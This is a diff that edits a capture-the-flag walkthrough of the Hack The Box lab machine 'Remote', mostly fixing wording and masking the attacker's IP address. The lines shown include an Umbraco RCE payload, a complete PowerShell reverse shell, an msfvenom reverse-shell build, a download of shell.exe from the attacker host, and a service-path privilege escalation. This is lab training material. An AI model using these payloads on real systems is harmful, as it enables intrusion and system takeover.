@@ -1,4 +1,4 @@
-# Remote - hackthebox.eu
+# Remote Write-up / Walkthrough - HTB
 
 ![remote badge](images/remote/remotebadge.jpg)
 
@@ -149,7 +149,7 @@ adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SH
 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
 ```
 
-We managed to find a set of credentials to crack.
+We find a set of credentials to crack.
 
 ### Cracking Hashes
 
@@ -173,7 +173,7 @@ Now we have a set of credentials that we can try to login with.
 
 We have logged on successfully.
 
-**The Umbraco version is 7.12.4.** Hence, we can try the RCE exploit we found earlier.
+As we can see from the screenshot above, **the Umbraco version is 7.12.4.** Hence, we can try the RCE exploit we found earlier.
 
 ## Attacks and Exploits
 
@@ -196,7 +196,7 @@ So here, let's try to get Remote to ping our machine.
 First, let's change the payload to start `cmd.exe` with the argument `/c ping 10.10.10.10`.
 
 ```
-string cmd = "/C ping 10.10.14.3"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+string cmd = "/C ping 10.10.X.X"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
 proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }
@@ -221,7 +221,7 @@ listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
 From [this page](https://delta.navisec.io/reverse-shell-reference/#powershell), we find a nice reverse shell code for powershell.
 
 ```
-$client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("10.10.X.X",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 The payload code (as it is) will break the XSLT file. So let's base64 encode it.
 
@@ -246,16 +246,16 @@ After executing the exploit with the modified payload, we get a reverse shell fr
 ```
 root@kali:~/htb/remote# nc -nvlp 8888
 listening on [any] 8888 ...
-connect to [10.10.14.3] from (UNKNOWN) [10.10.10.180] 51745
+connect to [10.10.X.X] from (UNKNOWN) [10.10.10.180] 51745
 whoami
 iis apppool\defaultapppool
 PS C:\windows\system32\inetsrv>
 ```
-The user.txt in the `C:\Users\Public`.
+The user.txt is in `C:\Users\Public`.
 
 ## Privilege Escalation
 
-This is a great guide for [window privilege escalation](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html).
+[This is a great guide for window privilege escalation](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html).
 
 My first step is to run systeminfo and feed its output to windows exploit suggestor. But it did not return anything exploitable.
 
@@ -345,11 +345,11 @@ SERVICE_NAME: UsoSvc
 
 Now the BINARY_PATH_NAME points to shell.exe in the Temp folder. Let's generate a binary and place it in the Temp folder.
 
-`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=5555 -f exe > shell.exe`
+`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.X.X LPORT=5555 -f exe > shell.exe`
 
 After generating the shell binary, let's serve it up and download it into the Temp folder.
 
-On Remote: `Invoke-WebRequest -Uri http://10.10.14.3:8000/shell.exe -OutFile shell.exe`
+On Remote: `Invoke-WebRequest -Uri http://10.10.X.X:8000/shell.exe -OutFile shell.exe`
 
 Now, let's start the service to trigger the execution of the binary path. (Don't forget to start a reverse handler before that.)
 
@@ -369,7 +369,7 @@ Yes it did.
 ```
 root@kali:~/htb/remote# nc -nvlp 5555
 listening on [any] 5555 ...
-connect to [10.10.14.3] from (UNKNOWN) [10.10.10.180] 49787
+connect to [10.10.X.X] from (UNKNOWN) [10.10.10.180] 49787
 Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -380,7 +380,7 @@ nt authority\system
 
 If you want to use Metasploit for exploiting weak service permissions, use the module `exploit/windows/local/service_permissions`.
 
-## Ending Thoughts
+## Thoughts
 
 I've rooted a number of active boxes before this. But this is the first active box I've rooted without referring to the forum.
 
